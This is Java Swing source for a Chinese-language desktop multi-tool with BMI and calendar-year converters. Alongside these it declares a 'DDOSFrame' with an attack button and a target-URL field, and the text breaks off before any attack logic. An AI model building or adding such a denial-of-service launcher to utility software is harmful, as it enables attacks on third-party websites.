package ui;

import java.awt.Color;
import java.awt.FlowLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URL;
import java.net.URLConnection;
import java.text.NumberFormat;
import java.util.Scanner;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.net.URLClassLoader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @author Tershi
 */
public class Main extends javax.swing.JFrame {
    String t1 = "年為";
    String t2 = "年";
    ImageIcon img = new ImageIcon("bin\\unnamed.png");
    static String DDOSDSD = "1";
        String language = "zh_ROC";
    String Type;
    double resultA;
    private static BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
    private static int x = 0;
    private static int y = 0;             //身分證英文所代表的數字
    private static final int MOD = 10;
        ImageIcon IMG = new ImageIcon("bin\\unnamed.png");
    public static int[] charToInteger(char[] num) {
        int[] num1 = new int[num.length];

        for (int i = 1; i < num.length; i++) {
            num1[i] = num[i] & '\u000f';
        }
        return num1;
    }
    public Main() {
        initComponents();
        setLocationRelativeTo(null);
        setIconImage(this.IMG.getImage());
        setTitle("好好用der小工具 By 夏特稀");
        getContentPane().setBackground(new Color (255,0,204));
//        getContentPane().setBackground(Color.yellow);
//        getContentPane().setBackground(Color.WHITE);
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jCheckBoxMenuItem1 = new javax.swing.JCheckBoxMenuItem();
        BMIculc = new javax.swing.JFrame();
        jLabel1 = new javax.swing.JLabel();
        Hight = new javax.swing.JTextField();
        jLabel2 = new javax.swing.JLabel();
        Weight = new javax.swing.JTextField();
        jButton2 = new javax.swing.JButton();
        jButton3 = new javax.swing.JButton();
        jLabel3 = new javax.swing.JLabel();
        BMIval = new javax.swing.JTextField();
        jLabel4 = new javax.swing.JLabel();
        jLabel5 = new javax.swing.JLabel();
        s = new javax.swing.JFrame();
        a = new javax.swing.JFrame();
        ChineseYearFrame = new javax.swing.JFrame();
        Convert = new javax.swing.JButton();
        jScrollPane1 = new javax.swing.JScrollPane();
        te = new javax.swing.JTextArea();
        la = new javax.swing.JLabel();
        jScrollPane3 = new javax.swing.JScrollPane();
        roc = new javax.swing.JTextArea();
        jLabel6 = new javax.swing.JLabel();
        jLabel7 = new javax.swing.JLabel();
        jMenuBar2 = new javax.swing.JMenuBar();
        File = new javax.swing.JMenu();
        open = new javax.swing.JMenuItem();
        save = new javax.swing.JMenuItem();
        print = new javax.swing.JMenuItem();
        exit = new javax.swing.JMenuItem();
        Edit = new javax.swing.JMenu();
        cp = new javax.swing.JMenuItem();
        ps = new javax.swing.JMenuItem();
        More = new javax.swing.JMenu();
        pre = new javax.swing.JMenuItem();
        about = new javax.swing.JMenuItem();
        aboutFrame = new javax.swing.JFrame();
        jScrollPane2 = new javax.swing.JScrollPane();
        jTextArea1 = new javax.swing.JTextArea();
        Close = new javax.swing.JButton();
        preFrame = new javax.swing.JFrame();
        Language = new javax.swing.JButton();
        Sure = new javax.swing.JButton();
        LanguageForm = new javax.swing.JFrame();
        Chinese = new javax.swing.JButton();
        English = new javax.swing.JButton();
        jComboBox1 = new javax.swing.JComboBox<>();
        jMenuItem8 = new javax.swing.JMenuItem();
        jMenu3 = new javax.swing.JMenu();
        DDOSFrame = new javax.swing.JFrame();
        jScrollPane4 = new javax.swing.JScrollPane();
        Console = new javax.swing.JTextArea();
        AttackButton = new javax.swing.JButton();
        jScrollPane5 = new javax.swing.JScrollPane();
        urlInput = new javax.swing.JTextArea();
        jLabel8 = new javax.swing.JLabel();
        jLabel9 = new javax.swing.JLabel();
        CancelButton = new javax.swing.JButton();
        jMenuBar3 = new javax.swing.JMenuBar();
        jMenu4 = new javax.swing.JMenu();
        Exit = new javax.swing.JMenuItem();
        Exit1 = new javax.swing.JMenuItem();
        Exit2 = new javax.swing.JMenuItem();
        Exit5 = new javax.swing.JMenuItem();
        Exit3 = new javax.swing.JMenuItem();
        jMenu5 = new javax.swing.JMenu();
        jMenuItem2 = new javax.swing.JMenuItem();
        jMenuItem3 = new javax.swing.JMenuItem();
        jMenuItem4 = new javax.swing.JMenuItem();
        jMenu6 = new javax.swing.JMenu();
        jMenuItem1 = new javax.swing.JMenuItem();
        FileChooseFrame = new javax.swing.JFrame();
        FileChoose = new javax.swing.JFileChooser();
        preference = new javax.swing.JFrame();
        fontButton = new javax.swing.JButton();
        wordButton = new javax.swing.JButton();
        bgButton = new javax.swing.JButton();
        displayAreaButton = new javax.swing.JButton();
        urlAreaButton = new javax.swing.JButton();
        presssure1 = new javax.swing.JButton();
        disPlayButton = new javax.swing.JButton();
        languageButton = new javax.swing.JButton();
        FontFrame = new javax.swing.JFrame();
        TitleFontWord = new javax.swing.JLabel();
        jCheckBox1 = new javax.swing.JCheckBox();
        jCheckBox2 = new javax.swing.JCheckBox();
        ChooseFontWord = new javax.swing.JLabel();
        jCheckBox3 = new javax.swing.JCheckBox();
        jCheckBox4 = new javax.swing.JCheckBox();
        indexFontWord = new javax.swing.JLabel();
        jCheckBox5 = new javax.swing.JCheckBox();
        jCheckBox6 = new javax.swing.JCheckBox();
        presssure2 = new javax.swing.JButton();
        bgFrame = new javax.swing.JFrame();
        displayArea = new javax.swing.JFrame();
        urlAreaFrame = new javax.swing.JFrame();
        disPlay = new javax.swing.JFrame();
        langFrame = new javax.swing.JFrame();
        TredChinese = new javax.swing.JButton();
        SimpChinese = new javax.swing.JButton();
        English1 = new javax.swing.JButton();
        Japanese = new javax.swing.JButton();
        ABClang = new javax.swing.JButton();
        SurePress1 = new javax.swing.JButton();
        wordFrame = new javax.swing.JFrame();
        AboutFrame = new javax.swing.JFrame();
        jScrollPane6 = new javax.swing.JScrollPane();
        jTextArea2 = new javax.swing.JTextArea();
        presssure3 = new javax.swing.JButton();
        plus = new javax.swing.JFrame();
        jScrollPane7 = new javax.swing.JScrollPane();
        NumA = new javax.swing.JTextArea();
        jScrollPane8 = new javax.swing.JScrollPane();
        NumB = new javax.swing.JTextArea();
        culc = new javax.swing.JButton();
        jButton4 = new javax.swing.JButton();
        jButton5 = new javax.swing.JButton();
        jButton6 = new javax.swing.JButton();
        jButton7 = new javax.swing.JButton();
        plusType = new javax.swing.JLabel();
        resultNameFont = new javax.swing.JLabel();
        ResultA = new javax.swing.JTextField();
        leftB = new javax.swing.JButton();
        getHTML = new javax.swing.JFrame();
        jScrollPane9 = new javax.swing.JScrollPane();
        Console1 = new javax.swing.JTextArea();
        jScrollPane10 = new javax.swing.JScrollPane();
        UrlArea = new javax.swing.JTextArea();
        PressSure = new javax.swing.JButton();
        PressClear = new javax.swing.JButton();
        uiMenuBar = new javax.swing.JMenuBar();
        file = new javax.swing.JMenu();
        save1 = new javax.swing.JMenuItem();
        open1 = new javax.swing.JMenuItem();
        left = new javax.swing.JMenuItem();
        editMenu = new javax.swing.JMenu();
        Copy = new javax.swing.JMenuItem();
        Paste = new javax.swing.JMenuItem();
        Cut = new javax.swing.JMenuItem();
        Clear = new javax.swing.JMenuItem();
        Sure1 = new javax.swing.JMenuItem();
        Windows = new javax.swing.JMenu();
        preferenceMenu = new javax.swing.JMenuItem();
        Help = new javax.swing.JMenu();
        doc = new javax.swing.JMenuItem();
        netSupport = new javax.swing.JMenuItem();
        keyWords = new javax.swing.JMenuItem();
        report = new javax.swing.JMenuItem();
        HTMLdoc = new javax.swing.JMenuItem();
        about1 = new javax.swing.JMenuItem();
        jMenu7 = new javax.swing.JMenu();
        plusMenu = new javax.swing.JMenuItem();
        ThanksForUsing = new javax.swing.JFrame();
        MainAboutFrame = new javax.swing.JFrame();
        jScrollPane11 = new javax.swing.JScrollPane();
        jTextArea3 = new javax.swing.JTextArea();
        jButton1 = new javax.swing.JButton();
        InstallFrame = new javax.swing.JFrame();
        jScrollPane12 = new javax.swing.JScrollPane();
        installPath = new javax.swing.JTextArea();
        jLabel10 = new javax.swing.JLabel();
        jButton8 = new javax.swing.JButton();
        jScrollPane13 = new javax.swing.JScrollPane();
        installError = new javax.swing.JTextArea();
        ChineseButton = new javax.swing.JButton();
        Bmi = new javax.swing.JButton();
        Painter = new javax.swing.JButton();
        Culc = new javax.swing.JButton();
        DDOSButton = new javax.swing.JButton();
        htmlFrame = new javax.swing.JButton();
        MC = new javax.swing.JButton();
        MC1 = new javax.swing.JButton();
        jMenuBar1 = new javax.swing.JMenuBar();
        jMenu1 = new javax.swing.JMenu();
        jMenuItem5 = new javax.swing.JMenuItem();
        jMenu8 = new javax.swing.JMenu();
        MainAbout = new javax.swing.JMenuItem();

        jCheckBoxMenuItem1.setSelected(true);
        jCheckBoxMenuItem1.setText("jCheckBoxMenuItem1");

        BMIculc.setMinimumSize(new java.awt.Dimension(320, 400));
        BMIculc.setPreferredSize(new java.awt.Dimension(320, 400));

        jLabel1.setFont(new java.awt.Font("新細明體", 0, 24)); // NOI18N
        jLabel1.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel1.setText("身高:");

        Hight.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                HightActionPerformed(evt);
            }
        });

        jLabel2.setFont(new java.awt.Font("新細明體", 0, 24)); // NOI18N
        jLabel2.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel2.setText("體重:");

        Weight.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                WeightActionPerformed(evt);
            }
        });

        jButton2.setText("計算");
        jButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2ActionPerformed(evt);
            }
        });

        jButton3.setText("離開");
        jButton3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton3ActionPerformed(evt);
            }
        });

        jLabel3.setFont(new java.awt.Font("新細明體", 0, 24)); // NOI18N
        jLabel3.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel3.setText("值:");

        BMIval.setEditable(false);
        BMIval.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                BMIvalActionPerformed(evt);
            }
        });

        jLabel4.setFont(new java.awt.Font("新細明體", 0, 18)); // NOI18N
        jLabel4.setText("公分");

        jLabel5.setFont(new java.awt.Font("新細明體", 0, 18)); // NOI18N
        jLabel5.setText("公斤");

        javax.swing.GroupLayout BMIculcLayout = new javax.swing.GroupLayout(BMIculc.getContentPane());
        BMIculc.getContentPane().setLayout(BMIculcLayout);
        BMIculcLayout.setHorizontalGroup(
            BMIculcLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(BMIculcLayout.createSequentialGroup()
                .addGroup(BMIculcLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, BMIculcLayout.createSequentialGroup()
                        .addComponent(jLabel3, javax.swing.GroupLayout.PREFERRED_SIZE, 61, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(BMIval))
                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, BMIculcLayout.createSequentialGroup()
                        .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 61, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(BMIculcLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jButton3, javax.swing.GroupLayout.PREFERRED_SIZE, 168, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(jButton2, javax.swing.GroupLayout.PREFERRED_SIZE, 168, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(Weight)))
                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, BMIculcLayout.createSequentialGroup()
                        .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 61, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(Hight, javax.swing.GroupLayout.PREFERRED_SIZE, 193, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(0, 12, Short.MAX_VALUE)))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(BMIculcLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jLabel4)
                    .addComponent(jLabel5))
                .addContainerGap())
        );
        BMIculcLayout.setVerticalGroup(
            BMIculcLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(BMIculcLayout.createSequentialGroup()
                .addGroup(BMIculcLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addGroup(BMIculcLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                        .addComponent(Hight, javax.swing.GroupLayout.PREFERRED_SIZE, 50, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addComponent(jLabel4))
                    .addGroup(BMIculcLayout.createSequentialGroup()
                        .addGap(1, 1, 1)
                        .addComponent(jLabel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)))
                .addGroup(BMIculcLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(BMIculcLayout.createSequentialGroup()
                        .addGap(18, 18, 18)
                        .addGroup(BMIculcLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(Weight, javax.swing.GroupLayout.PREFERRED_SIZE, 50, javax.swing.GroupLayout.PREFERRED_SIZE)))
                    .addGroup(BMIculcLayout.createSequentialGroup()
                        .addGap(38, 38, 38)
                        .addComponent(jLabel5)))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(BMIculcLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel3, javax.swing.GroupLayout.PREFERRED_SIZE, 40, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(BMIval, javax.swing.GroupLayout.PREFERRED_SIZE, 50, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 35, Short.MAX_VALUE)
                .addComponent(jButton2, javax.swing.GroupLayout.PREFERRED_SIZE, 48, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jButton3, javax.swing.GroupLayout.PREFERRED_SIZE, 48, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(85, 85, 85))
        );

        s.setMinimumSize(new java.awt.Dimension(300, 400));

        javax.swing.GroupLayout sLayout = new javax.swing.GroupLayout(s.getContentPane());
        s.getContentPane().setLayout(sLayout);
        sLayout.setHorizontalGroup(
            sLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );
        sLayout.setVerticalGroup(
            sLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );

        a.setMinimumSize(new java.awt.Dimension(300, 400));

        javax.swing.GroupLayout aLayout = new javax.swing.GroupLayout(a.getContentPane());
        a.getContentPane().setLayout(aLayout);
        aLayout.setHorizontalGroup(
            aLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 300, Short.MAX_VALUE)
        );
        aLayout.setVerticalGroup(
            aLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 400, Short.MAX_VALUE)
        );

        ChineseYearFrame.setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);
        ChineseYearFrame.setTitle("天干地支 by夏特稀");
        ChineseYearFrame.setMinimumSize(new java.awt.Dimension(354, 298));

        Convert.setText("轉換");
        Convert.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                ConvertActionPerformed(evt);
            }
        });

        te.setColumns(20);
        te.setRows(5);
        jScrollPane1.setViewportView(te);

        la.setFont(new java.awt.Font("新細明體", 0, 24)); // NOI18N
        la.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);

        roc.setColumns(20);
        roc.setRows(5);
        jScrollPane3.setViewportView(roc);

        jLabel6.setFont(new java.awt.Font("新細明體", 0, 24)); // NOI18N
        jLabel6.setText("西元:");

        jLabel7.setFont(new java.awt.Font("新細明體", 0, 24)); // NOI18N
        jLabel7.setText("中華民國:");

        File.setText("ㄉ案");

        open.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_O, java.awt.event.InputEvent.CTRL_MASK));
        open.setText("開啟");
        open.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                openActionPerformed(evt);
            }
        });
        File.add(open);

        save.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_S, java.awt.event.InputEvent.CTRL_MASK));
        save.setText("儲存");
        save.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                saveActionPerformed(evt);
            }
        });
        File.add(save);

        print.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_P, java.awt.event.InputEvent.CTRL_MASK));
        print.setText("列印");
        File.add(print);

        exit.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_F4, java.awt.event.InputEvent.ALT_MASK));
        exit.setText("離開");
        exit.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                exitActionPerformed(evt);
            }
        });
        File.add(exit);

        jMenuBar2.add(File);

        Edit.setText("ㄅ輯");

        cp.setText("複製");
        cp.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                cpActionPerformed(evt);
            }
        });
        Edit.add(cp);

        ps.setText("貼上");
        Edit.add(ps);

        jMenuBar2.add(Edit);

        More.setText("更多");

        pre.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_P, java.awt.event.InputEvent.ALT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        pre.setText("偏好設定");
        pre.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                preActionPerformed(evt);
            }
        });
        More.add(pre);

        about.setAccelerator(javax.swing.KeyStroke.getKeyStroke(java.awt.event.KeyEvent.VK_A, java.awt.event.InputEvent.ALT_MASK | java.awt.event.InputEvent.CTRL_MASK));
        about.setText("關於");
        about.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                aboutActionPerformed(evt);
            }
        });
        More.add(about);

        jMenuBar2.add(More);

        ChineseYearFrame.setJMenuBar(jMenuBar2);

        javax.swing.GroupLayout ChineseYearFrameLayout = new javax.swing.GroupLayout(ChineseYearFrame.getContentPane());
        ChineseYearFrame.getContentPane().setLayout(ChineseYearFrameLayout);
        ChineseYearFrameLayout.setHorizontalGroup(
            ChineseYearFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(ChineseYearFrameLayout.createSequentialGroup()
                .addGroup(ChineseYearFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(ChineseYearFrameLayout.createSequentialGroup()
                        .addComponent(jLabel7, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addGap(36, 36, 36))
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, ChineseYearFrameLayout.createSequentialGroup()
                        .addComponent(jLabel6, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)))
                .addGroup(ChineseYearFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jScrollPane3, javax.swing.GroupLayout.DEFAULT_SIZE, 259, Short.MAX_VALUE)
                    .addComponent(jScrollPane1)))
            .addGroup(ChineseYearFrameLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(ChineseYearFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(Convert, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, ChineseYearFrameLayout.createSequentialGroup()
                        .addComponent(la, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addContainerGap())))
        );
        ChineseYearFrameLayout.setVerticalGroup(
            ChineseYearFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, ChineseYearFrameLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(ChineseYearFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(ChineseYearFrameLayout.createSequentialGroup()
                        .addComponent(jLabel6, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addGap(44, 44, 44)
                        .addComponent(jLabel7, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addGap(42, 42, 42))
                    .addGroup(ChineseYearFrameLayout.createSequentialGroup()
                        .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 60, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jScrollPane3, javax.swing.GroupLayout.PREFERRED_SIZE, 64, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(30, 30, 30)))
                .addComponent(la, javax.swing.GroupLayout.DEFAULT_SIZE, 53, Short.MAX_VALUE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(Convert, javax.swing.GroupLayout.DEFAULT_SIZE, 48, Short.MAX_VALUE))
        );

        aboutFrame.setTitle("關於");
        aboutFrame.setMinimumSize(new java.awt.Dimension(500, 500));

        jTextArea1.setColumns(20);
        jTextArea1.setRows(5);
        jTextArea1.setText("夏特稀天干地支轉換器\n版本:v1.6\n使用語言:Java 不須手動安裝Java 內附Jre\n\n(C) Aishen-Shanling Team 2020\n(C) Tershi 2020\n");
        jScrollPane2.setViewportView(jTextArea1);

        Close.setText("關閉");
        Close.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                CloseActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout aboutFrameLayout = new javax.swing.GroupLayout(aboutFrame.getContentPane());
        aboutFrame.getContentPane().setLayout(aboutFrameLayout);
        aboutFrameLayout.setHorizontalGroup(
            aboutFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane2)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, aboutFrameLayout.createSequentialGroup()
                .addGap(111, 111, 111)
                .addComponent(Close, javax.swing.GroupLayout.DEFAULT_SIZE, 262, Short.MAX_VALUE)
                .addGap(127, 127, 127))
        );
        aboutFrameLayout.setVerticalGroup(
            aboutFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(aboutFrameLayout.createSequentialGroup()
                .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 356, Short.MAX_VALUE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(Close, javax.swing.GroupLayout.DEFAULT_SIZE, 128, Short.MAX_VALUE)
                .addContainerGap())
        );

        preFrame.setTitle("偏好設定");
        preFrame.setMinimumSize(new java.awt.Dimension(300, 324));

        Language.setText("語言");
        Language.setMaximumSize(new java.awt.Dimension(50, 50));
        Language.setMinimumSize(new java.awt.Dimension(50, 50));
        Language.setPreferredSize(new java.awt.Dimension(50, 50));
        Language.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                LanguageActionPerformed(evt);
            }
        });

        Sure.setText("確定");
        Sure.setMaximumSize(new java.awt.Dimension(50, 50));
        Sure.setMinimumSize(new java.awt.Dimension(50, 50));
        Sure.setPreferredSize(new java.awt.Dimension(50, 50));
        Sure.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                SureActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout preFrameLayout = new javax.swing.GroupLayout(preFrame.getContentPane());
        preFrame.getContentPane().setLayout(preFrameLayout);
        preFrameLayout.setHorizontalGroup(
            preFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, preFrameLayout.createSequentialGroup()
                .addGap(63, 63, 63)
                .addGroup(preFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(Sure, javax.swing.GroupLayout.DEFAULT_SIZE, 166, Short.MAX_VALUE)
                    .addComponent(Language, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addGap(71, 71, 71))
        );
        preFrameLayout.setVerticalGroup(
            preFrameLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(preFrameLayout.createSequentialGroup()
                .addGap(81, 81, 81)
                .addComponent(Language, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(61, 61, 61)
                .addComponent(Sure, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(82, Short.MAX_VALUE))
        );

        LanguageForm.setTitle("語言");
        LanguageForm.setMinimumSize(new java.awt.Dimension(230, 230));

        Chinese.setText("中文");
        Chinese.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                ChineseActionPerformed(evt);
            }
        });

        English.setText("English");
        English.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                EnglishActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout LanguageFormLayout = new javax.swing.GroupLayout(LanguageForm.getContentPane());
        LanguageForm.getContentPane().setLayout(LanguageFormLayout);
        LanguageFormLayout.setHorizontalGroup(
            LanguageFormLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(LanguageFormLayout.createSequentialGroup()
                .addGap(70, 70, 70)
                .addGroup(LanguageFormLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(English, javax.swing.GroupLayout.DEFAULT_SIZE, 73, Short.MAX_VALUE)
                    .addComponent(Chinese, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap(86, Short.MAX_VALUE))
        );
        LanguageFormLayout.setVerticalGroup(
            LanguageFormLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(LanguageFormLayout.createSequentialGroup()
                .addGap(87, 87, 87)
                .addComponent(Chinese, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(English, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGap(87, 87, 87))
        );

        jComboBox1.setModel(new javax.swing.DefaultComboBoxModel<>(new String[] { "Item 1", "Item 2", "Item 3", "Item 4" }));

        jMenuItem8.setText("jMenuItem8");

        jMenu3.setText("jMenu3");

        DDOSFrame.setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);
        DDOSFrame.setBackground(new java.awt.Color(0, 204, 204));
        DDOSFrame.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        DDOSFrame.setMinimumSize(new java.awt.Dimension(721, 620));

        Console.setColumns(20);
        Console.setRows(5);
        jScrollPane4.setViewportView(Console);

        AttackButton.setText("確定");
        AttackButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                AttackButtonActionPerformed(evt);
            }
        });

        urlInput.setColumns(20);
        urlInput.setRows(5);
        urlInput.setText("http://網址/");
